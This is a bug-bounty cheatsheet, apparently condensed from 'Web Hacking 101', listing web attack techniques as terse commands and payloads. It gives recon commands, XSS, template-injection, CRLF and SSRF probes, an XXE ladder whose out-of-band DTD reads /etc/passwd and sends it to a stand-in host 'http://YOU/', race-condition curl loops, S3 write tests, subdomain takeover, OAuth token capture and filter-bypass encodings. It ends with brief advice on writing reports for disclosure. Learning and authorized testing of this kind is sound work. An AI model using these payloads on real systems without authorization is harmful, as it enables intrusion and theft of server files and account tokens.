# Cheatsheet — Web Hacking 101

## Recon quick-fire

```
knockpy domain.com -w subdomains-top1mil-110000.txt   # subdomains
enumall (recon-ng) + ipv4info.com                     # more subdomains
nmap -sSV -oA out -T4 -iL ips.csv                     # services on enum'd hosts
whois target.com → netblock → loop wget /phpinfo.php  # IP-range sweep
site:*.target.com / site:play.target.com ext:php      # dorks
GitRob → org repos + contributors                     # secrets in code
```

## Probes while mapping

```
<img src="x" onerror=alert(1)>        # universal XSS probe
{{4*4}}[[5*5]]                        # Angular probe (both syntaxes)
<h1>/<form action=//evil>             # HTML injection
&uid= + duplicate param               # HPP
%0d%0a                                # CRLF in cookie/header params
?url=http://yourip/x.png → ?url=http://yourip/?x.png   # SSRF ext bypass
.redirect_to= ?domain_name= ?checkout_url= ?next=      # redirect params
/reports/12345.json                   # Rails .json exposure
{"__proto__":{}} / template {{7*7}}   # proto/SSTI
```

## XXE ladder

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">            → &xxe; (in-band)
<!ENTITY xxe SYSTEM "http://YOU/XXE">                → &xxe; (blind ping)
<!ENTITY % file SYSTEM "file:///etc/passwd">          (OOB payload)
<!ENTITY % dtd SYSTEM "http://YOU/x.dtd"> %dtd; %send;
  x.dtd: <!ENTITY % all "<!ENTITY send SYSTEM 'http://YOU/?%26file;'>">%all;
```

Deliver via: XML endpoints, .xml/.gpx/.svg upload, .docx/.xlsx (unzip → inject DOCTYPE → rezip), SOAP.

## Logic checks

- Two accounts → replay privileged calls with the lesser account (params removed too).
- Race: `curl url & curl url & …` ×6+ on transfer/vote/redeem endpoints.
- OTP POST → append `user[login]=victim`; check token lifetime/attempts/reuse.
- S3: wordlist `<co>-backup/-media/.marketing/.files` → `aws s3 mv test.txt s3://bucket` (write-test even when ls denied).
- Subdomain CNAME → dead service fingerprint → can-i-take-over-xyz → claim.
- OAuth: pre-authorized apps (`facebook.com/search/me/apps-used`-style) → claimable `redirect_uri` → token capture.

## Filter-bypass table

| Blocked | Try |
|---------|-----|
| `0x0a` newline | `%E5%98%8A` UTF-8, `%250d%250a` double-encode |
| `&` in value | `%26` (decodes after escape) |
| File ext check | `?`, `%00`, `//`, `..;/` tricks |
| Client-side validation | proxy — server likely trusts it |
| HTML sanitize | malformed tags, duplicate attrs, stray `=` |

## Report minimum

```
URL + params | browser/OS/app | impact-to-them | repro steps | screenshot/video
```

- Confirm on fresh versions · don't cry wolf · polite ping after ~2 weeks · dispute bounties with reasoning, not asking.
